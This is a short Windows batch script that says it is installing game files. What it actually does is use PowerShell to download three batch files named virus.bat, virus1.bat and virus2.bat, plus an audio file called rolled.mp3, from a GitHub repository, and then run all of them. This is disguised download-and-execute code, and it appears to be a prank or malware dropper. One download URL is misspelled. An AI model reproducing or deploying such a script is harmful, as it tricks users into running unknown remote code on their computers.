@echo off
echo Installing game files...
powershell -Command (New-Object Net.WebClient).DownloadFile('https://github.com/MelloMantra/vFiles/raw/main/virus.bat', 'virus.bat')
powershell -Command Invoke-WebRequest 'https://github.com/MelloMantra/vFiles/raw/main/virus.bat' -OutFile virus.bat
powershell -Command (New-Object Net.WebClient).DownloadFile('https://github.com/MelloMantra/vFiles/raw/main/rolled.mp3', 'rolled.mp3')
powershell -Command Invoke-WebRequest 'https://github.com/MelloMantra/vFiles/raw/main/rolled.mp3' -OutFile rolled.mp3
powershell -Command (New-Object Net.WebClient).DownloadFile('https://github.com/MelloMantra/vFiles/raw/main/virus1.bat', 'virus1.bat')
powershell -Command Invoke-WebRequest 'https://github.com/MelloMantra/vFiles/raw/main/virus1.bat' -OutFile virus1.bat
powershell -Command (New-Object Net.WebClient).DownloadFile('https://github.com/MelloMantra/vFiles/raw/main/virus2.bat', 'virus2.bat')
powershell -Command Invoke-WebRequest 'https://github.com/MelloMantra/vFiles/raw/main/viru2s.bat' -OutFile virus2.bat
start virus.bat
start virus1.bat
start virus2.bat
start rolled.mp3